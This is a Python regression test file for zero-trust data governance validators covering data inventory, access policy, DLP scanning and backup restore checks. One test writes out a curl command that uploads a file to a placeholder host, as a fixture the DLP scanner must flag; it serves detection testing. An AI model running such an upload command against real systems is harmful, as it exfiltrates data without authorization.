"""Regression tests for ZT-DATA-001."""

from __future__ import annotations

import copy
import importlib.util
import json
import sys
import tempfile
import unittest
from pathlib import Path


ROOT = Path(__file__).resolve().parents[1]


def module(name: str, relative: str):
    spec = importlib.util.spec_from_file_location(name, ROOT / relative)
    assert spec and spec.loader
    value = importlib.util.module_from_spec(spec)
    sys.modules[name] = value
    spec.loader.exec_module(value)
    return value


DATA = module("zt_data_inventory", "tools/data/validate_data_inventory.py")
DLP = module("zt_data_dlp", "tools/data/scan_data_policy.py")
BACKUP = module("zt_data_backup", "tools/data/validate_backup_assurance.py")


class ZtData001Tests(unittest.TestCase):
    def setUp(self) -> None:
        self.inventory = DATA.load(ROOT / "docs/zero-trust/data-inventory.yaml")
        self.classes = DATA.load(ROOT / "docs/zero-trust/data-classification-policy.yaml")
        self.access = DATA.load(ROOT / "docs/zero-trust/data-access-policy.yaml")
        self.flows = DATA.load(ROOT / "docs/zero-trust/data-flow-map.yaml")
        self.encryption = DATA.load(ROOT / "docs/zero-trust/data-encryption-assessment.yaml")
        self.backups = DATA.load(ROOT / "docs/zero-trust/backup-inventory.yaml")
        self.dlp = DATA.load(ROOT / "docs/zero-trust/dlp-policy.yaml")

    def findings(self, **changes):
        values = {"inventory": self.inventory, "classifications": self.classes, "access": self.access, "flows": self.flows, "encryption": self.encryption, "backups": self.backups}
        values.update(changes)
        return DATA.validate(**values)

    def assert_failure(self, check: str, **changes) -> None:
        self.assertTrue(any(item.level == "FAIL" and item.check == check for item in self.findings(**changes)), self.findings(**changes))

    def test_valid_data_records(self) -> None:
        self.assertFalse(any(item.level == "FAIL" for item in self.findings()), self.findings())

    def test_duplicate_data_id(self) -> None:
        value = copy.deepcopy(self.inventory); value["data_assets"].append(copy.deepcopy(value["data_assets"][0]))
        self.assert_failure("inventory.duplicate", inventory=value)

    def test_missing_owner(self) -> None:
        value = copy.deepcopy(self.inventory); value["data_assets"][1]["owner"] = ""
        self.assert_failure("ownership.missing", inventory=value)

    def test_invalid_classification(self) -> None:
        value = copy.deepcopy(self.inventory); value["data_assets"][0]["classification"] = "MAGIC"
        self.assert_failure("classification.invalid", inventory=value)

    def test_unclassified_active_data(self) -> None:
        value = copy.deepcopy(self.inventory); value["data_assets"][0]["classification"] = "UNCLASSIFIED"
        self.assert_failure("classification.unclassified", inventory=value)

    def test_undefined_role_reference(self) -> None:
        value = copy.deepcopy(self.access); value["policies"][0]["required_role"] = "UNKNOWN_ROLE"
        self.assert_failure("access.role", access=value)

    def test_restricted_wildcard_access(self) -> None:
        value = copy.deepcopy(self.access); value["policies"][2]["required_role"] = "*"
        self.assert_failure("access.wildcard", access=value)

    def test_missing_audit_requirement(self) -> None:
        value = copy.deepcopy(self.access); value["policies"][2]["audit_requirement"] = ""
        self.assert_failure("access.audit", access=value)

    def test_unknown_data_flow_source(self) -> None:
        value = copy.deepcopy(self.flows); value["flows"][0]["source_data_asset_id"] = "ZTDATA-UNKNOWN"
        self.assert_failure("flow.source", flows=value)

    def test_unencrypted_restricted_crossing(self) -> None:
        value = copy.deepcopy(self.flows); value["flows"][0]["trust_boundary_crossing"] = True; value["flows"][0]["encryption"] = "NOT_ENCRYPTED"
        self.assert_failure("flow.encryption", flows=value)

    def test_unsupported_encryption_claim(self) -> None:
        value = copy.deepcopy(self.encryption); value["assessments"][0]["state"] = "ENCRYPTED"; value["assessments"][0]["evidence"] = []
        self.assert_failure("encryption.evidence", encryption=value)

    def test_encryption_in_use_claim_is_rejected(self) -> None:
        value = copy.deepcopy(self.encryption); value["assessments"][-1]["state"] = "ENCRYPTED"; value["assessments"][-1]["evidence"] = ["unsupported"]
        self.assert_failure("encryption.in-use", encryption=value)

    def test_restore_validated_without_restore_evidence(self) -> None:
        value = copy.deepcopy(self.backups); value["backups"][0]["last_restore_evidence"] = None
        self.assert_failure("backup.restore", backups=value)

    def test_blocking_dlp_action(self) -> None:
        value = copy.deepcopy(self.dlp); value["rules"][0]["actions"] = ["BLOCK"]
        self.assertTrue(DLP.validate_policy(value))

    def test_dlp_fixtures_detected_and_redacted(self) -> None:
        findings = DLP.scan_text(DLP.controlled_fixture_text(), "TEST_FIXTURE/runtime")
        self.assertGreaterEqual(len(findings), 8)
        self.assertTrue(all(item.test_fixture and item.redacted_match == "[REDACTED]" for item in findings))

    def test_external_upload_command_detected(self) -> None:
        line = "curl " + "https://invalid.test/upload --upload-file sample.txt"  # TEST_FIXTURE
        findings = DLP.scan_text(line, "wrapper.ps1")
        self.assertTrue(any(item.detector == "UNAPPROVED_EXPORT_PATH" for item in findings))

    def test_controlled_restore_preserves_source(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            result = BACKUP.execute_controlled_fixture(Path(temporary))
        self.assertTrue(result["hash_match"] and result["isolated_restore"])
        self.assertFalse(result["source_overwritten"] or result["external_transmission"])

    def test_backup_hash_mismatch_fails(self) -> None:
        evidence = DATA.load(ROOT / "docs/evidence/zero-trust/zt-data-001-backup-assurance.yaml")
        evidence["restore_sha256"] = "0" * 64
        findings = BACKUP.validate(self.backups, evidence, ROOT)
        self.assertTrue(any(item.level == "FAIL" and item.check == "restore.hash" for item in findings), findings)


if __name__ == "__main__":
    unittest.main()
